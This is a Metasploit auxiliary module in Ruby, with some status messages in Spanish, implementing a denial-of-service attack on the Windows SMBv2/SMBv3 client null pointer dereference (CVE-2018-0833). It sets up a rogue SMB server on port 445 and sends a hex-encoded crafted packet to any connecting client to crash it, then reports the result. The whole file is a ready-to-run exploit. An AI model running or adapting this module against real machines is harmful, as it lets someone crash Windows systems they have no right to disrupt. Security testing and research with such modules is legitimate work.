##
# $Id$
##

class  MetasploitModule < Msf::Auxiliary
	include Msf::Auxiliary::Dos
	include Msf::Exploit::Remote::TcpServer
	def initialize(info = {})
		super(update_info(info,
      'Name'           => 'SMB3 Null Pointer Dereference',
      'Description'    => %q{
        The Microsoft Server Message Block 2.0 and 3.0 (SMBv2/SMBv3) client in Windows 8.1 and RT 8.1 and 
        Windows Server 2012 R2         allows a denial of service vulnerability due to how specially crafted
        requests are handled, aka "SMBv2/SMBv3 Null Dereference Denial of Service Vulnerability".
      },
      'Author'         => [ 'KING SABRI | @KINGSABRI adaptado a msf por VÃ­ctor Sanz' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2018-0833']
        ]
    ))
	register_options([
      OptPort.new('SRVPORT', [ true, "The SMB port to listen on", 445 ])
    ])

	end

	def run
		print_status("Empezando")
    	print_status("Para probarlo acceda a \\\\#{Rex::Socket.source_address('1.2.3.4')}")
    	exploit
	end

	def on_client_connect(client)
		payload = '000000ecfd534d4241414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141'
		
    	print_status("Se ha conectado")
    	sploit = [payload].pack('H*')
    	response = client.get_once(-1, 1)    	
        client.put(sploit)
        response = client.get_once(-1, 1)
        client.close

        if( not response )
      		print_status( "No response. The target system has probably crashed." )
    	else
      		print_status( "Response received. The target system is not vulnerable:\n#{response.inspect}" )
    	end	    
	    disconnect
	        
  	end
	
end

